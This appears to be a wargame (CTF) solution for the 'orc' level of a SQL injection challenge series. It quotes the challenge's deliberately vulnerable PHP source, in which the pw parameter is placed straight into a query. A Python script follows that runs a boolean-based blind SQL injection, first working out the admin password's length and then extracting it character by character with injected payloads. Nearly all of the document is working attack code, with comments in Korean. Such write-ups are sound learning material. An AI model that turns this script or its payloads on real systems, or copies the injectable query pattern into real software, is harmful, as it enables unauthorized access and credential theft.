'''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
'''
import requests
from urllib import parse

host = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="

# cookie를 넣어야하는듯?
# 안넣으면 request가 안됨..
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
password_length = 0

print("password length find start !! ")
# 패스워드 길이 확인 -> 8
for i in range(1, 100) :    
    param = f"'||id='admin' and length(pw) = {i} -- -"
    res = requests.get(host + parse.quote(param), cookies=cookies)
    if "Hello admin" in res.text :
        print(f"password length is {i}")
        password_length = 8
        break
print("password length find end !! ")    

# 패스워드 추출
admin_password = ""
for i in range(1, password_length + 1) :
    for j in range(47, 123) : # 48~57 0~9 / 65 ~90 A-Z 97~122 a-z    
        param = f"'||id='admin' and ascii(substr(pw, {str(i)}, 1)) = {str(j)} -- -"
        res = requests.get(host + parse.quote(param), cookies=cookies)
        if "Hello admin" in res.text :
            admin_password += chr(j)
            break
    print(f"now password ... {admin_password}")
print(f"admin password is {admin_password}")